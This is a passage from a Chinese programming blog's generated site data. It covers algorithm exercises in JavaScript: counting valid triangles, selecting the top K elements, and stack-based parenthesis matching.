(<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; nums.length - <span class=\"number\">2</span>; i++) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> j = i + <span class=\"number\">1</span>; j &lt; nums.length - <span class=\"number\">1</span>; j++) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> k = j + <span class=\"number\">1</span>; k &lt; nums.length; k++) &#123;</span><br><span class=\"line\">        checkResult(nums[i], nums[j], nums[k])</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> result</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(triangleNumber([<span class=\"number\">2</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>])) <span class=\"comment\">// 3</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(triangleNumber([<span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>]))  <span class=\"comment\">// 0</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(triangleNumber([<span class=\"number\">24</span>,<span class=\"number\">3</span>,<span class=\"number\">82</span>,<span class=\"number\">22</span>,<span class=\"number\">35</span>,<span class=\"number\">84</span>,<span class=\"number\">19</span>])) <span class=\"comment\">// 20</span></span><br></pre></td></tr></table></figure>\n\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * -- 二分查找 --</span></span><br><span class=\"line\"><span class=\"comment\"> * 1. 首先对数组排序。</span></span><br><span class=\"line\"><span class=\"comment\"> * 2. 固定最短的两条边，二分查找最后一个小于两边之和的位置。可以求得固定两条边长之和满足条件的结果。枚举* 结束后，总和就是答案。</span></span><br><span class=\"line\"><span class=\"comment\"> * 时间复杂度为 O(n^2logn)</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">triangleNumber</span>(<span class=\"params\">nums</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (nums.length &lt; <span class=\"number\">3</span>) <span class=\"keyword\">return</span> <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\">  nums.sort(<span class=\"function\">(<span class=\"params\">a, b</span>) =&gt;</span> a - b)</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">let</span> count = <span class=\"number\">0</span></span><br><span class=\"line\">  <span class=\"keyword\">let</span> searchPosition = <span class=\"function\">(<span class=\"params\">left, right, sum</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> (left &lt;= right &amp;&amp; right &lt; nums.length) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">let</span> middle = <span class=\"built_in\">Math</span>.floor((left + right + <span class=\"number\">1</span>) / <span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (nums[middle] &gt;= sum) &#123;</span><br><span class=\"line\">        right = middle - <span class=\"number\">1</span></span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        left = middle + <span class=\"number\">1</span></span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">Math</span>.floor(left)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">let</span> len = nums.length</span><br><span class=\"line\">  <span class=\"keyword\">for</span>(<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; len - <span class=\"number\">2</span>; i++) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> j = i + <span class=\"number\">1</span>; j &lt; len - <span class=\"number\">1</span>; j++) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (nums[i] !== <span class=\"number\">0</span>) &#123; <span class=\"comment\">// 某条边为 0 时不能形成三角形</span></span><br><span class=\"line\">        k = searchPosition(j + <span class=\"number\">1</span>, len - <span class=\"number\">1</span>, nums[i] + nums[j])</span><br><span class=\"line\">        count += k - j - <span class=\"number\">1</span></span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> count</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * -- 双指针 --</span></span><br><span class=\"line\"><span class=\"comment\"> * 1. 首先对数组排序。</span></span><br><span class=\"line\"><span class=\"comment\"> * 2. 固定最长的一条边，运用双指针扫描</span></span><br><span class=\"line\"><span class=\"comment\"> * 2.1 如果 nums[l] + nums[r] &gt; nums[i]，同时说明 nums[l + 1] + nums[r] &gt; nums[i], ..., nums[r - 1] + nums[r] &gt; nums[i]，满足的条件的有 r - l 种，r 左移进入下一轮。</span></span><br><span class=\"line\"><span class=\"comment\"> * 2.2 如果 nums[l] + nums[r] &lt;= nums[i]，l 右移进入下一轮。</span></span><br><span class=\"line\"><span class=\"comment\"> * 枚举结束后，总和就是答案。</span></span><br><span class=\"line\"><span class=\"comment\"> * 时间复杂度为 O(n^2)</span></span><br><span class=\"line\"><span class=\"comment\"> )。</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">triangleNumber</span>(<span class=\"params\">nums</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (nums.length &lt; <span class=\"number\">3</span>) <span class=\"keyword\">return</span> <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\">  nums.sort(<span class=\"function\">(<span class=\"params\">a, b</span>) =&gt;</span> a - b)</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">let</span> count = <span class=\"number\">0</span></span><br><span class=\"line\">  <span class=\"keyword\">let</span> len = nums.length</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = len - <span class=\"number\">1</span>; i &gt;= <span class=\"number\">2</span>; --i) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> left = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> right = i - <span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">while</span> (left &lt; right) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (nums[left] + nums[right] &gt; nums[i]) &#123;</span><br><span class=\"line\">        count += right - left</span><br><span class=\"line\">        --right</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        ++left</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> count</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>"},{"title":"技巧篇 - 多种排序算法 - top K 问题","date":"2021-05-24T08:32:28.000Z","_content":"\n# 技巧篇 - 多种排序算法 - top K 问题\n\n> 问题描述：从 arr 这 n 个数中，找出最大的 k 个数\n> 输入: [1, 4, 2, 7, 5, 3, 8, 6], 4\n> 输出: [5, 6, 7, 8]\n\n### 1. 数组全排序\n\n**步骤**：\n1. 对数组 arr 进行全排序，如使用快排\n2. 取出最大的 k 个数\n\n时间复杂度为：`nlgn`，优化点为：不需要对所有数据都排序\n\n\n### 2. 局部排序\n\n**步骤**：\n1. 使用冒泡排序算法的思路，遍历一次数组，找出最大的数字\n2. 重复上面的步骤，知道找出最大的 k 个数字\n\n时间复杂度：`n·k`，优化点为：可以不必对这 k 个数字排序\n\n### 3. 使用堆排序选出最大的 k 个元素\n\n**步骤**：\n1. 选前 `k` 个元素，构建小根堆，\n2. 选第 `k + 1` 个元素，与堆顶元素比较，如果该元素大于堆顶元素，则替换堆顶元素并调整堆结构，否则忽略该元素\n3. 重复上一步，直指所有元素都扫描完，此时堆结构里为最大的 `k` 个元素\n\n时间复杂度：`nlgk`\n\n### 4. 使用快排思路解决\n\n减治法：分治法的一种，是把一个大的问题，转化为若干个子问题），这些子问题中**只**需要解决一个，便可以得到大问题的解，例如 `二分查找`、`寻找平方根`\n\n思路：使用减治法先找出第 k 大的数，然后再找出 top K 的结果\n\n**步骤**：\n1. 找到 `i = partition(arr, low, high)`，利用快排的思路实现 `partition`，使得 `i` 左边的元素小于 `arr[i]`，`i` 右边的元素大于 `arr[i]`\n2. 如果 `i` 等于 `k`，则 `i` 右边的元素为问题的解\n3. 如果 `i` 小于 `k`，则说明说明第 `k` 大的元素在 `arr[i]` 的右边，于是只递归 `arr[i+1, n]` 里第 `k` 大的元素即可；\n3. 如果 `i` 大于 `k`，则说明 `arr[i]` 左边的元素都大于 `k`，于是只递归 `arr[1, i-1]` 里第 `k` 大的元素即可；\n4. 重复以上步骤，当 `i = k` 时，即到找出最大的 `k` 个数\n\n\n\n","source":"_posts/算法题/技巧篇 - 多种排序算法 - top K 问题.md","raw":"---\ntitle: 技巧篇 - 多种排序算法 - top K 问题\ncategories: 算法题\ntags: [算法题, 技巧篇]\ndate: 2021-05-24 16:32:28\n---\n\n# 技巧篇 - 多种排序算法 - top K 问题\n\n> 问题描述：从 arr 这 n 个数中，找出最大的 k 个数\n> 输入: [1, 4, 2, 7, 5, 3, 8, 6], 4\n> 输出: [5, 6, 7, 8]\n\n### 1. 数组全排序\n\n**步骤**：\n1. 对数组 arr 进行全排序，如使用快排\n2. 取出最大的 k 个数\n\n时间复杂度为：`nlgn`，优化点为：不需要对所有数据都排序\n\n\n### 2. 局部排序\n\n**步骤**：\n1. 使用冒泡排序算法的思路，遍历一次数组，找出最大的数字\n2. 重复上面的步骤，知道找出最大的 k 个数字\n\n时间复杂度：`n·k`，优化点为：可以不必对这 k 个数字排序\n\n### 3. 使用堆排序选出最大的 k 个元素\n\n**步骤**：\n1. 选前 `k` 个元素，构建小根堆，\n2. 选第 `k + 1` 个元素，与堆顶元素比较，如果该元素大于堆顶元素，则替换堆顶元素并调整堆结构，否则忽略该元素\n3. 重复上一步，直指所有元素都扫描完，此时堆结构里为最大的 `k` 个元素\n\n时间复杂度：`nlgk`\n\n### 4. 使用快排思路解决\n\n减治法：分治法的一种，是把一个大的问题，转化为若干个子问题），这些子问题中**只**需要解决一个，便可以得到大问题的解，例如 `二分查找`、`寻找平方根`\n\n思路：使用减治法先找出第 k 大的数，然后再找出 top K 的结果\n\n**步骤**：\n1. 找到 `i = partition(arr, low, high)`，利用快排的思路实现 `partition`，使得 `i` 左边的元素小于 `arr[i]`，`i` 右边的元素大于 `arr[i]`\n2. 如果 `i` 等于 `k`，则 `i` 右边的元素为问题的解\n3. 如果 `i` 小于 `k`，则说明说明第 `k` 大的元素在 `arr[i]` 的右边，于是只递归 `arr[i+1, n]` 里第 `k` 大的元素即可；\n3. 如果 `i` 大于 `k`，则说明 `arr[i]` 左边的元素都大于 `k`，于是只递归 `arr[1, i-1]` 里第 `k` 大的元素即可；\n4. 重复以上步骤，当 `i = k` 时，即到找出最大的 `k` 个数\n\n\n\n","slug":"算法题/技巧篇 - 多种排序算法 - top K 问题","published":1,"updated":"2021-06-07T10:00:22.423Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckpmga1yl000gok6r0lcpe9gh","content":"<h1 id=\"技巧篇-多种排序算法-top-K-问题\"><a href=\"#技巧篇-多种排序算法-top-K-问题\" class=\"headerlink\" title=\"技巧篇 - 多种排序算法 - top K 问题\"></a>技巧篇 - 多种排序算法 - top K 问题</h1><blockquote>\n<p>问题描述：从 arr 这 n 个数中，找出最大的 k 个数<br>输入: [1, 4, 2, 7, 5, 3, 8, 6], 4<br>输出: [5, 6, 7, 8]</p>\n</blockquote>\n<h3 id=\"1-数组全排序\"><a href=\"#1-数组全排序\" class=\"headerlink\" title=\"1. 数组全排序\"></a>1. 数组全排序</h3><p><strong>步骤</strong>：</p>\n<ol>\n<li>对数组 arr 进行全排序，如使用快排</li>\n<li>取出最大的 k 个数</li>\n</ol>\n<p>时间复杂度为：<code>nlgn</code>，优化点为：不需要对所有数据都排序</p>\n<h3 id=\"2-局部排序\"><a href=\"#2-局部排序\" class=\"headerlink\" title=\"2. 局部排序\"></a>2. 局部排序</h3><p><strong>步骤</strong>：</p>\n<ol>\n<li>使用冒泡排序算法的思路，遍历一次数组，找出最大的数字</li>\n<li>重复上面的步骤，知道找出最大的 k 个数字</li>\n</ol>\n<p>时间复杂度：<code>n·k</code>，优化点为：可以不必对这 k 个数字排序</p>\n<h3 id=\"3-使用堆排序选出最大的-k-个元素\"><a href=\"#3-使用堆排序选出最大的-k-个元素\" class=\"headerlink\" title=\"3. 使用堆排序选出最大的 k 个元素\"></a>3. 使用堆排序选出最大的 k 个元素</h3><p><strong>步骤</strong>：</p>\n<ol>\n<li>选前 <code>k</code> 个元素，构建小根堆，</li>\n<li>选第 <code>k + 1</code> 个元素，与堆顶元素比较，如果该元素大于堆顶元素，则替换堆顶元素并调整堆结构，否则忽略该元素</li>\n<li>重复上一步，直指所有元素都扫描完，此时堆结构里为最大的 <code>k</code> 个元素</li>\n</ol>\n<p>时间复杂度：<code>nlgk</code></p>\n<h3 id=\"4-使用快排思路解决\"><a href=\"#4-使用快排思路解决\" class=\"headerlink\" title=\"4. 使用快排思路解决\"></a>4. 使用快排思路解决</h3><p>减治法：分治法的一种，是把一个大的问题，转化为若干个子问题），这些子问题中<strong>只</strong>需要解决一个，便可以得到大问题的解，例如 <code>二分查找</code>、<code>寻找平方根</code></p>\n<p>思路：使用减治法先找出第 k 大的数，然后再找出 top K 的结果</p>\n<p><strong>步骤</strong>：</p>\n<ol>\n<li>找到 <code>i = partition(arr, low, high)</code>，利用快排的思路实现 <code>partition</code>，使得 <code>i</code> 左边的元素小于 <code>arr[i]</code>，<code>i</code> 右边的元素大于 <code>arr[i]</code></li>\n<li>如果 <code>i</code> 等于 <code>k</code>，则 <code>i</code> 右边的元素为问题的解</li>\n<li>如果 <code>i</code> 小于 <code>k</code>，则说明说明第 <code>k</code> 大的元素在 <code>arr[i]</code> 的右边，于是只递归 <code>arr[i+1, n]</code> 里第 <code>k</code> 大的元素即可；</li>\n<li>如果 <code>i</code> 大于 <code>k</code>，则说明 <code>arr[i]</code> 左边的元素都大于 <code>k</code>，于是只递归 <code>arr[1, i-1]</code> 里第 <code>k</code> 大的元素即可；</li>\n<li>重复以上步骤，当 <code>i = k</code> 时，即到找出最大的 <code>k</code> 个数</li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"技巧篇-多种排序算法-top-K-问题\"><a href=\"#技巧篇-多种排序算法-top-K-问题\" class=\"headerlink\" title=\"技巧篇 - 多种排序算法 - top K 问题\"></a>技巧篇 - 多种排序算法 - top K 问题</h1><blockquote>\n<p>问题描述：从 arr 这 n 个数中，找出最大的 k 个数<br>输入: [1, 4, 2, 7, 5, 3, 8, 6], 4<br>输出: [5, 6, 7, 8]</p>\n</blockquote>\n<h3 id=\"1-数组全排序\"><a href=\"#1-数组全排序\" class=\"headerlink\" title=\"1. 数组全排序\"></a>1. 数组全排序</h3><p><strong>步骤</strong>：</p>\n<ol>\n<li>对数组 arr 进行全排序，如使用快排</li>\n<li>取出最大的 k 个数</li>\n</ol>\n<p>时间复杂度为：<code>nlgn</code>，优化点为：不需要对所有数据都排序</p>\n<h3 id=\"2-局部排序\"><a href=\"#2-局部排序\" class=\"headerlink\" title=\"2. 局部排序\"></a>2. 局部排序</h3><p><strong>步骤</strong>：</p>\n<ol>\n<li>使用冒泡排序算法的思路，遍历一次数组，找出最大的数字</li>\n<li>重复上面的步骤，知道找出最大的 k 个数字</li>\n</ol>\n<p>时间复杂度：<code>n·k</code>，优化点为：可以不必对这 k 个数字排序</p>\n<h3 id=\"3-使用堆排序选出最大的-k-个元素\"><a href=\"#3-使用堆排序选出最大的-k-个元素\" class=\"headerlink\" title=\"3. 使用堆排序选出最大的 k 个元素\"></a>3. 使用堆排序选出最大的 k 个元素</h3><p><strong>步骤</strong>：</p>\n<ol>\n<li>选前 <code>k</code> 个元素，构建小根堆，</li>\n<li>选第 <code>k + 1</code> 个元素，与堆顶元素比较，如果该元素大于堆顶元素，则替换堆顶元素并调整堆结构，否则忽略该元素</li>\n<li>重复上一步，直指所有元素都扫描完，此时堆结构里为最大的 <code>k</code> 个元素</li>\n</ol>\n<p>时间复杂度：<code>nlgk</code></p>\n<h3 id=\"4-使用快排思路解决\"><a href=\"#4-使用快排思路解决\" class=\"headerlink\" title=\"4. 使用快排思路解决\"></a>4. 使用快排思路解决</h3><p>减治法：分治法的一种，是把一个大的问题，转化为若干个子问题），这些子问题中<strong>只</strong>需要解决一个，便可以得到大问题的解，例如 <code>二分查找</code>、<code>寻找平方根</code></p>\n<p>思路：使用减治法先找出第 k 大的数，然后再找出 top K 的结果</p>\n<p><strong>步骤</strong>：</p>\n<ol>\n<li>找到 <code>i = partition(arr, low, high)</code>，利用快排的思路实现 <code>partition</code>，使得 <code>i</code> 左边的元素小于 <code>arr[i]</code>，<code>i</code> 右边的元素大于 <code>arr[i]</code></li>\n<li>如果 <code>i</code> 等于 <code>k</code>，则 <code>i</code> 右边的元素为问题的解</li>\n<li>如果 <code>i</code> 小于 <code>k</code>，则说明说明第 <code>k</code> 大的元素在 <code>arr[i]</code> 的右边，于是只递归 <code>arr[i+1, n]</code> 里第 <code>k</code> 大的元素即可；</li>\n<li>如果 <code>i</code> 大于 <code>k</code>，则说明 <code>arr[i]</code> 左边的元素都大于 <code>k</code>，于是只递归 <code>arr[1, i-1]</code> 里第 <code>k</code> 大的元素即可；</li>\n<li>重复以上步骤，当 <code>i = k</code> 时，即到找出最大的 <code>k</code> 个数</li>\n</ol>\n"},{"title":"技巧篇 - 栈结构","date":"2021-05-24T08:32:28.000Z","_content":"\n# 技巧篇 - 栈结构\n\n### 判断是否有有效的括号\n**问题：**给定一个只包括 '('，')'，'{'，'}'，'['，']' 的字符串，判断字符串是否有效。\n\n有效字符串需满足：\n* 左括号必须用相同类型的右括号闭合。\n* 左括号必须以正确的顺序闭合。\n* 注意空字符串可被认为是有效字符串。\n\n**示例：**\n输入: \"()[]{}\"\n输出: true\n\n输入: \"([)]\"\n输出: false\n\n\n```js\nvar isValid = function(s) {\n  const stack = [];\n\n  for (let i = 0; i < s.length; i++) {\n    const char = s[i];\n\n    if (['(', '{', '['].indexOf(char) > -1) {\n      stack.push(char);\n    } else {\n      if (!stack.length) return false;\n\n      const top = stack.pop();\n      if (top === '(' && char !== ')') return false;\n      if (top === '[' && char !== ']') return false;\n      if (top === '{' && char !== '}') return false;\n    }\n  }\n\n  return stack.length === 0;\n};\n\n```\n\n### 有效括号的子串的最大长度\n**问题：**给定一个只包含 '(' 和 ')' 的字符串，找出最长的包含有效括号的子串的长度。\n\n**示例：**\n输入: \"(()\"\n输出: 2\n解释: 最长有效括号子串为 \"()\"\n\n输入: \")()())\"\n输出: 4\n解释: 最长有效括号子串为 \"()()\"\n\n**思路：**\n1. 遍历整个字符串，res 保存遍历过程中满足条件的最大值，start 表示为起始位置\n2. 如果遇到 `(` 则把对应的索引压入栈 `stack` 中\n3. 如果遇到 `)` 则进行一下判断\n   1. 如果当前栈为空，说明已匹配完成，将 `start` 设置为 `i + 1`\n   2. 如果当前栈不为空，则**取出栈顶元素**，并再进行下一步判断\n      1. 如果此时栈为空，说明取出后刚好匹配完成，将 `res` 设置为 `Math.max(res, i - start + 1)`;\n      2. 如果此时栈不为空，说明指匹配到了部分元素，将 `res` 设置为 `Math.max(res, i - stack.top())`\n\n\n```js\nvar longestValidParentheses = function(s) {\n  let stack = [];\n  let res = 0;\n  let start = 0;\n\n  for (let i = 0; i < s.length; i++) {\n    if (s[i] === '(') {\n      stack.push(i);\n    } else if (s[i] === ')') {\n      if (stack.length === 0) {\n        start = i + 1;\n      } else {\n        stack.pop();\n\n        if (stack.length === 0) {\n          res = Math.max(res, i - start + 1);\n        } else {\n          res = Math.max(res, i - stack[stack.length - 1]);\n        }\n      }\n    }\n  }\n\n  return res;\n};\n```","source":"_posts/算法题/技巧篇 - 栈结构.md","raw":"---\ntitle: 技巧篇 - 栈结构\ncategories: 算法题\ntags: [算法题, 技巧篇]\ndate: 2021-05-24 16:32:28\n---\n\n# 技巧篇 - 栈结构\n\n### 判断是否有有效的括号\n**问题：**给定一个只包括 '('，')'，'{'，'}'，'['，']' 的字符串，判断字符串是否有效。\n\n有效字符串需满足：\n* 左括号必须用相同类型的右括号闭合。\n* 左括号必须以正确的顺序闭合。\n* 注意空字符串可被认为是有效字符串。\n\n**示例：**\n输入: \"()[]{}\"\n输出: true\n\n输入: \"([)]\"\n输出: false\n\n\n```js\nvar isValid = function(s) {\n  const stack = [];\n\n  for (let i = 0; i < s.length; i++) {\n    const char = s[i];\n\n    if (['(', '{', '['].indexOf(char) > -1) {\n      stack.push(char);\n    } else {\n      if (!stack.length) return false;\n\n      const top = stack.pop();\n      if (top === '(' && char !== ')') return false;\n      if (top === '[' && char !== ']') return false;\n      if (top === '{' && char !== '}') return false;\n    }\n  }\n\n  return stack.length === 0;\n};\n\n```\n\n### 有效括号的子串的最大长度\n**问题：**给定一个只包含 '(' 和 ')' 的字符串，找出最长的包含有效括号的子串的长度。\n\n**示例：**\n输入: \"(()\"\n输出: 2\n解释: 最长有效括号子串为 \"()\"\n\n输入: \")()())\"\n输出: 4\n解释: 最长有效括号子串为 \"()()\"\n\n**思路：**\n1. 遍历整个字符串，res 保存遍历过程中满足条件的最大值，start 表示为起始位置\n2. 如果遇到 `(` 则把对应的索引压入栈 `stack` 中\n3. 如果遇到 `)` 则进行一下判断\n   1. 如果当前栈为空，说明已匹配完成，将 `start` 设置为 `i + 1`\n   2. 如果当前栈不为空，则**取出栈顶元素**，并再进行下一步判断\n      1. 如果此时栈为空，说明取出后刚好匹配完成，将 `res` 设置为 `Math.max(res, i - start + 1)`;\n      2. 如果此时栈不为空，说明指匹配到了部分元素，将 `res` 设置为 `Math.max(res, i - stack.top())`\n\n\n```js\nvar longestValidParentheses = function(s) {\n  let stack = [];\n  let res = 0;\n  let start = 0;\n\n  for (let i = 0; i < s.length; i++) {\n    if (s[i] === '(') {\n      stack.push(i);\n    } else if (s[i] === ')') {\n      if (stack.length === 0) {\n        start = i + 1;\n      } else {\n        stack.pop();\n\n        if (stack.length === 0) {\n          res = Math.max(res, i - start + 1);\n        } else {\n          res = Math.max(res, i - stack[stack.length - 1]);\n        }\n      }\n    }\n  }\n\n  return res;\n};\n```","slug":"算法题/技巧篇 - 栈结构","published":1,"updated":"2021-06-07T10:03:36.815Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckpmga1yn000kok6rhf654lvv","content":"<h1 id=\"技巧篇-栈结构\"><a href=\"#技巧篇-栈结构\" class=\"headerlink\" title=\"技巧篇 - 栈结构\"></a>技巧篇 - 栈结构</h1><h3 id=\"判断是否有有效的括号\"><a href=\"#判断是否有有效的括号\" class=\"headerlink\" title=\"判断是否有有效的括号\"></a>判断是否有有效的括号</h3><p><strong>问题：</strong>给定一个只包括 ‘(‘，’)’，’{‘，’}’，’[‘，’]’ 的字符串，判断字符串是否有效。</p>\n<p>有效字符串需满足：</p>\n<ul>\n<li>左括号必须用相同类型的右括号闭合。</li>\n<li>左括号必须以正确的顺序闭合。</li>\n<li>注意空字符串可被认为是有效字符串。</li>\n</ul>\n<p><strong>示例：</strong><br>输入: “()[]{}”<br>输出: true</p>\n<p>输入: “([)]”<br>输出: false</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> isValid = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">s</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> stack = [];</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; s.length; i++) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> char = s[i];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ([<span class=\"string\">&#x27;(&#x27;</span>, <span class=\"string\">&#x27;&#123;&#x27;</span>, <span class=\"string\">&#x27;[&#x27;</span>].indexOf(char) &gt; -<span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">      stack.push(char);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (!stack.length) <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">const</span> top = stack.pop();</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (top === <span class=\"string\">&#x27;(&#x27;</span> &amp;&amp; char !== <span class=\"string\">&#x27;)&#x27;</span>) <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (top === <span class=\"string\">&#x27;[&#x27;</span> &amp;&amp; char !== <span class=\"string\">&#x27;]&#x27;</span>) <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (top === <span class=\"string\">&#x27;&#123;&#x27;</span> &amp;&amp; char !== <span class=\"string\">&#x27;&#125;&#x27;</span>) <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> stack.length === <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"有效括号的子串的最大长度\"><a href=\"#有效括号的子串的最大长度\" class=\"headerlink\" title=\"有效括号的子串的最大长度\"></a>有效括号的子串的最大长度</h3><p><strong>问题：</strong>给定一个只包含 ‘(‘ 和 ‘)’ 的字符串，找出最长的包含有效括号的子串的长度。</p>\n<p><strong>示例：</strong><br>输入: “(()”<br>输出: 2<br>解释: 最长有效括号子串为 “()”</p>\n<p>输入: “)()())”<br>输出: 4<br>解释: 最长有效括号子串为 “()()”</p>\n<p><strong>思路：</strong></p>\n<ol>\n<li>遍历整个字符串，res 保存遍历过程中满足条件的最大值，start 表示为起始位置</li>\n<li>如果遇到 <code>(</code> 